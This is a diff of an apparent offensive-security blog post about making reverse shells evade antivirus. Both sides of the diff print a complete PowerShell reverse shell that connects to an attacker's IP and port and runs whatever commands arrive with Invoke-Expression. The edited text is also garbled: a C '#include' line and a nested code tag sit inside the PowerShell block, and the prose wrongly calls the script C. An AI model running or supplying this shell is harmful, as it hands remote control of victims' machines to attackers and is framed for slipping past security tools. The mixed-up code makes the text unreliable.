@@ -90,48 +90,48 @@
           
         Posts
       </aside><div id="sharing" class="mt3 ananke-socials"></div>
-<h1 class="f1 athelas mt3 mb1">Upgrading Reverse Shell in C to evade AV mechanisms</h1>
-<h3>This post is an attempt to evade AV mechanisms/tools to generate undetectable reverse shell in C, To start I have mentioned a very basic C code which generates a Callback to a remote listener.    
-	<div>
-    <h3>PowerShell Reverse Shell</h3>
+<h1 class="f1 athelas mt3 mb1">Upgrading Reverse Shell to evade AV mechanisms</h1>
+<h3>This post will discuss reverse shells in general and how to improve their effectiveness to evade antivirus tools, we will be 
+  looking at some of the techniques which can be used to obfuscate and generate robust callback scripts to the attacking machine.  
+
+  I will be using powershell in this scenario, but the techniques mentioned are same regardless of the programming language used.
+  Below is an example of a reverse shell script that attempts to connect back to a machine, once executed.
+</h3>
+  <div>
+    <h3>PowerShell Snippet</h3>
     <pre><code>
-        # Reverse Shell in PowerShell
-        $ip = "192.168.1.100"    # Replace with attacker's IP
-        $port = 4444              # Replace with desired port
-
-        # Create a TCP client
-        $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
-        $stream = $client.GetStream()
-        $reader = New-Object System.IO.StreamReader($stream)
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $writer.AutoFlush = $true
-
-        # Redirect input, output, and error
-        while ($client.Connected) {
-            $command = $reader.ReadLine()
-            if ($command -eq "exit") { break }
-
-            try {
-                # Execute the command and capture output
-                $output = (Invoke-Expression -Command $command 2>&1 | Out-String)
+        #include <winsock2.h>
+          <pre><code class="language-powershell">
+            # Reverse Shell in PowerShell
+            $ip = "192.168.1.100"
+            $port = 4444
+            $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
+            $stream = $client.GetStream()
+            $reader = New-Object System.IO.StreamReader($stream)
+            $writer = New-Object System.IO.StreamWriter($stream)
+            $writer.AutoFlush = $true
+            
+            while ($client.Connected) {
+                $command = $reader.ReadLine()
+                if ($command -eq "exit") { break }
+                try {
+                    $output = (Invoke-Expression -Command $command 2>&1 | Out-String)
+                }
+                catch {
+                    $output = "Error: $_"
+                }
+                $writer.WriteLine($output)
             }
-            catch {
-                $output = "Error: $_"
-            }
-
-            # Send output back to attacker
-            $writer.WriteLine($output)
-        }
-
-        # Clean up
-        $reader.Close()
-        $writer.Close()
-        $client.Close()
-    </code></pre>
+            $reader.Close()
+            $writer.Close()
+            $client.Close()
+            </code></pre>            
 </div>
+      <h3>This is a generic reverse shell written in C. already, you can tell that this is very suspicious,
+         as it is very easy to guess whats going on. In a nutshell, this code generate a socket connection to the specified IP
+          and the port number, once the connection is established, it reads the commands sent by the attacker. </h3>
       
-      
-      
+      <h3>Lets save this and check its results on virustotal.com</h3>
 
       
       
